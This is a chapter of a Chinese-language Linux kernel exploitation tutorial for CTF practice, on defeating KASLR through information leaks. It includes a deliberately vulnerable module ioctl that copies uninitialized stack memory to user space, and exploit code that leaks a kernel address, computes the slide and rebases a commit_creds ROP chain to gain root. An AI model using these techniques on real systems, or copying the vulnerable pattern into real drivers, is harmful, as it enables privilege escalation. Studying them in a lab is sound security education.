# Ch 6 — KASLR 與 info leak：leak 途徑大全

> 目標：前兩章所有 hardcode 的地址在 KASLR 下每次 boot 都變。我們需要 **leak 一個已知 kernel 符號的地址**、算出 slide、把所有 gadget / function 地址平移回來。這章講 leak 的幾條主要路徑、哪條在什麼 CTF 題裡最有效。

## KASLR 在動什麼

Linux KASLR 有兩種 randomize：

| config | 動什麼 |
|---|---|
| `CONFIG_RANDOMIZE_BASE` | kernel **text** base 整體平移（0 - 1GB 之間某個 2MB 對齊值） |
| `CONFIG_RANDOMIZE_MEMORY` | physmap / vmalloc / modules 各 range 的 base 也平移 |

兩個**獨立** — 關 text KASLR 不影響 memory KASLR。Ch 0 build kernel 我們關了 `RANDOMIZE_MEMORY`（方便 debug），現在這章把 `RANDOMIZE_BASE` 打開：

```bash
cd ~/kpwn/kernel/linux-6.6.60-weak
./scripts/config --enable RANDOMIZE_BASE
./scripts/config --enable STACKPROTECTOR    # 一起開著練習完整 pipeline
make -j$(nproc) bzImage
```

改 `run-weak.sh`：`-append` 裡**拿掉** `nokaslr`（或改成什麼都不寫）。

## kernel slide 怎麼算

每次 boot 時 kernel text 整個 image 平移一個值 `slide`。任何一個 symbol 的實際地址 = 它編譯時的地址 + slide。

例如：
- 編譯時 `_text` = `0xffffffff81000000`（vmlinux 看到的）
- 開 KASLR boot 後 `_text` = `0xffffffff92a00000`
- `slide` = `0x11a00000`

只要 leak 到**任何一個** kernel text symbol，就算得出 slide：

```c
slide = leaked_addr - KNOWN_OFFSET_FROM_TEXT_BASE;
```

之後所有地址 = 編譯時地址 + slide。

## Leak 路徑總覽

CTF 裡最常見的六條：

| 路徑 | 難度 | 何時適用 |
|---|---|---|
| `/proc/kallsyms` | 送分題 | `kptr_restrict=0` 或 root |
| `dmesg` / printk 洩漏 | 低 | module `printk` 寫了 kernel addr |
| 讀 uninitialized kernel memory | 中 | 有 `copy_to_user` 沒清零 |
| 讀相鄰 object（heap leak） | 中 | UAF 或 OOB read |
| side channel（`prefetch`、TLB） | 高 | 無 primitive 時最後手段 |
| syscall 回傳內含地址 | 低-中 | 某些 syscall 結構體有 kernel addr |

我們挑頭三條實作。

## 路徑 1：`/proc/kallsyms`

kernel 符號表。正常系統：

```
$ grep " commit_creds$" /proc/kallsyms
0000000000000000 T commit_creds     ← 被 kptr_restrict hash 過
```

`kptr_restrict` 是 `sysctl kernel.kptr_restrict`：

| 值 | 行為 |
|---|---|
| 0 | 完全 leak（任何 user 都看到真地址） |
| 1 | `%pK` 格式有權限時顯示真地址，kallsyms 一般 user 看到 0 |
| 2 | 完全隱藏 |

CTF 題常設 1 或 2 故意擋這條。但 **`kallsyms` 讀進來的格式化邏輯也常有 bug**（去 Google `kallsyms leak CVE`），題目若設定寬鬆直接用。

```bash
# guest 裡先拉下來檢查
/ # sysctl kernel.kptr_restrict
kernel.kptr_restrict = 1
/ # cat /proc/kallsyms | head -5
0000000000000000 T _text
0000000000000000 T _stext
...  ← 全被 hash
```

要是 =0，所有地址原樣顯示，你直接 `grep` 撈：

```bash
BASE=$(awk '/ T _text$/ {print $1; exit}' /proc/kallsyms)
```

這類 CTF 題通常 kptr_restrict ≥ 1，所以此路當 baseline 不當正解。

## 路徑 2：dmesg 洩漏

`dmesg` 印過的每行都留在 kernel log buffer。如果 module 曾 `printk` 出 kernel 地址（例如初始化訊息），只要 `dmesg` 可讀就 leak。

Ch 2 的 module 印過：

```
vuln: /dev/vuln ready (kbuf @ ffffffffXXXXXXXX, vuln_ioctl @ ffffffffXXXXXXXX)
```

**這兩個地址是 module 載入後的**，在 modules 區（`0xffffffffc0...` 附近）— 不在 kernel text 上。但你可以算出 **module base**、然後用 module 裡 gadget。

真實 CTF 題出題者**往往自己 printk 一個 kernel symbol** 幫你 bootstrap（例如 `printk("kbase = %px\n", (void*)kallsyms_lookup_name)`）。那就直接 `dmesg` 撈。

`dmesg` 預設權限：`dmesg_restrict` 控制：

```
/ # sysctl kernel.dmesg_restrict
kernel.dmesg_restrict = 0   ← 這題沒擋
```

=1 時只有 CAP_SYSLOG 能讀。

## 路徑 3：讀 uninitialized kernel memory（最實用）

這是**真正 kernel pwn 的 leak 主力**。

Ch 2 module 有個細節：`local[64]` 在 stack 上宣告，**沒 memset**。如果有個 ioctl `VULN_PEEK` 把 `local` 整片 `copy_to_user` 回去：

```c
case VULN_PEEK:
    /* 洞 2：local 沒清零，leak 前一次 call 的 stack 內容 */
    copy_to_user(uarg, local, 64);
    return 0;
```

你先呼叫某個其他 syscall 讓 kernel stack 留下地址（最簡單：別呼叫，`vuln_ioctl` 進來時 stack 上本來就有前一層 caller 的 return address），然後 `VULN_PEEK` 讀回來，64 byte 裡會混著 kernel text 指標。

**實戰套路**：

1. 開 `/dev/vuln`
2. 呼叫 `VULN_PEEK`
3. scan 返回的 64 byte，找 `0xffffffff8X...` 開頭的 qword（kernel text）
4. 跟編譯時 `vmlinux` 裡對應 offset 的符號比對，算 slide

## Leak 的通用後處理

```c
unsigned long find_kernel_text(void *buf, size_t len) {
    unsigned long *p = buf;
    for (size_t i = 0; i < len/8; i++) {
        unsigned long v = p[i];
        /* kernel text 在 0xffffffff80000000 之上，且 text 段是 < 0xffffffffc0000000 */
        if ((v & 0xfffffff000000000UL) == 0xffffffff80000000UL)
            return v;
    }
    return 0;
}
```

拿到 leaked_addr 後：

```c
/* 假設你知道這個 leak 來自哪個 symbol 的附近（通常是 return address 往回推） */
unsigned long slide = leaked_addr - KNOWN_SYMBOL_OFFSET;
unsigned long commit_creds_real = 0xffffffff810c4b30UL + slide;
```

更穩的做法：leak 一個你 **確定** 的值（例如 canary 附近的 return address 就是 `vuln_ioctl` 的 caller），用 gdb 預先查出這個 caller 的編譯時偏移，硬算 slide。

## Step 1 — 給 vuln module 加一個 leak primitive

```bash
cp -r ~/kpwn/module/ch05-vuln ~/kpwn/module/ch06-vuln
cd ~/kpwn/module/ch06-vuln
```

在 `vuln.c` 加 `VULN_PEEK`：

```c
#define VULN_PEEK _IOR('v', 2, char[256])

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
    case VULN_ECHO: /* 照 ch05 */ break;
    case VULN_PEEK: {
        char local[64]; /* 故意不清零 */
        /* 先呼叫一個可能把 return addr 塞進 stack 的 no-op */
        asm volatile("" ::: "memory");
        if (copy_to_user((void __user *)arg, local, 64))
            return -EFAULT;
        return 0;
    }
    default: return -ENOTTY;
    }
}
```

## Step 2 — leak 部分的 exploit

```c
/* ~/kpwn/exploit/ch06/exp.c */
#define VULN_PEEK _IOR('v', 2, char[256])

unsigned long leak_slide(int fd) {
    char buf[64] = {0};
    ioctl(fd, VULN_PEEK, buf);
    for (int i = 0; i < 8; i++) {
        unsigned long v = ((unsigned long*)buf)[i];
        printf("[%d] %016lx\n", i, v);
    }
    /* 挑出 kernel text 範圍的，手動決定哪個 offset 最穩 */
    /* 實務：多跑幾次觀察哪個 offset 一直是 kernel text */
    unsigned long leaked = ((unsigned long*)buf)[3]; /* 假設 offset 3 穩定是 return addr */
    /* KNOWN_RET_ADDR_NOSLIDE 是你從 vmlinux 查出的、不開 KASLR 時的值 */
    unsigned long slide = leaked - KNOWN_RET_ADDR_NOSLIDE;
    return slide;
}
```

怎麼知道「offset 3 是 return addr」？**關 KASLR boot 一次**，print 出來所有 8 個值，看哪個是 `0xffffffff81xxxxxx` — 那個 offset 就是要挑的位置。之後 KASLR 開了這個 offset 應該一直穩定（但實務上有時變動 — CTF 題開發時要驗證）。

或更穩妥：`leak_slide()` 裡直接 `for` 找第一個 `(v >> 32) == 0xffffffff` 且 `< 0xffffffffc0000000` 的值。

## Step 3 — 全部接起來

把 Ch 5 的 ROP chain 所有地址改成 `base + slide`：

```c
unsigned long slide = leak_slide(fd);
unsigned long pop_rdi_ret = POP_RDI_RET_NOSLIDE + slide;
unsigned long commit_creds = COMMIT_CREDS_NOSLIDE + slide;
unsigned long init_cred = INIT_CRED_NOSLIDE + slide;
unsigned long swapgs_restore = SWAPGS_RESTORE_NOSLIDE + slide;
/* 照 Ch 5 組 chain、打 */
```

KASLR 下跑起來應該和 Ch 5 一樣拿到 root，差別只是多了 leak 一次、算 slide。

## 其他 leak 管道速查

### 3a. `msg_msg` uninit read

SLUB 物件 free 掉後沒清，下次 alloc 到 `msg_msg` 能讀到前一個物件的內容。這是 **heap leak**（Ch 11 會大量用）。

### 3b. percpu offset via `current`

kernel stack 上每幾個 word 會出現 per-CPU 變數的地址（`cpu_current_top_of_stack`）。這些地址可以反推 per-CPU area 基址，對某些 data-only attack 有用。

### 3c. `sidechannel: prefetch`

純硬體時序 attack。執行 `prefetch [kaddr]` 再 `rdtsc`，如果 kaddr 被 map 過就快、沒 map 就慢。用 binary search 掃整個 text 範圍定位 base。極慢但**無需任何 primitive**。

### 3d. `ldt` / `gdt` 相關

某些 syscall 傳回結構體會內含 kernel 指標（例如 `getdents` 某些變形）。這類 CVE 偶爾出現，題目不常見。

## 常見踩雷

**Leak 到的是 `0xffffffff8XXXXXXX` 但 slide 算出來是離譜數字** — 你挑到的 offset 不是 return address 而是別的 kernel 指標（例如 per-CPU）。print 全 64 byte 比對 vmlinux 的 `nm` 找最接近的符號，確認是哪類指標。

**KASLR 下每次 leak 到的 offset 對應不同 symbol** — kernel stack 內容變了。找更穩定的 offset（通常越靠近 `local` 開頭的越不穩、遠的比較穩）。

**slide 不是 2 MB 對齊** — 你算的 `KNOWN_OFFSET` 錯了。KASLR slide 永遠是 2 MB 對齊。`slide & 0x1fffff == 0` 該成立。

**開 `RANDOMIZE_MEMORY` 後 `init_cred` 地址算不準** — `init_cred` 在 `.data`，受 text KASLR 影響（因為 vmlinux 整片一起平移）。但 heap object 地址在 direct map，受 memory KASLR 影響 — 這兩個 slide 不同！Ch 14 Dirty Pagetable 會處理。

## 動手練習

1. **關 `kptr_restrict`** (`echo 0 > /proc/sys/kernel/kptr_restrict`) 跑 `cat /proc/kallsyms | grep -E " T (commit_creds|_text)$"`，記下地址。重開 guest 再看，驗證每次不同。
2. **寫個腳本**：從 `vmlinux` 用 `nm` 撈出 `commit_creds` / `init_cred` / `pop rdi ret` 等符號的**編譯時地址**，輸出 header file 給 exploit include。以後換 kernel 版本就重跑。
3. **不靠 VULN_PEEK**，只靠 `dmesg | grep vuln_ioctl @` 抓 module base。算出 vuln module 裡任何 symbol 的地址 — 這是「modules 區 leak」。module base 和 kernel text base 的 offset 關係你要自己算一次。
4. **實作 3a 的 `msg_msg` uninit leak**（Ch 11 會細講 msg_msg）— 先預習。
5. **寫個 `search-slide.py`**：吃一個 leaked 地址、一本 `vmlinux` 的 `nm` 輸出，算出 slide 並印出常用符號的平移後地址。

## 自我檢核

- [ ] 知道 `CONFIG_RANDOMIZE_BASE` 跟 `CONFIG_RANDOMIZE_MEMORY` 各平移什麼
- [ ] 能默寫 `slide = leaked - known_offset`、下一步怎麼算其他 symbol
- [ ] 能至少寫出三種 leak 路徑（kallsyms、dmesg、uninit stack / heap）
- [ ] 知道 `kptr_restrict` 三個值各自的行為
- [ ] 看到 `0xffffffffc0xxxxxx` 能馬上說「那是 module 區，不是 kernel text」
- [ ] 理解 KASLR slide 永遠 2 MB 對齊的原因

下一章處理 KPTI — 你現在 exploit 跑起來會在 `iretq` 那裡炸，因為 KPTI 打開後 kernel 跟 user 是兩張 page table，直接 `iretq` 回 user cr3 還沒切。我們學 `swapgs_restore_regs_and_return_to_usermode` 跟 signal trampoline 兩種乾淨出口。

→ [Ch 7 — KPTI：swapgs_restore_regs_and_return_to_usermode 與 signal trampoline](./07-kpti.md)
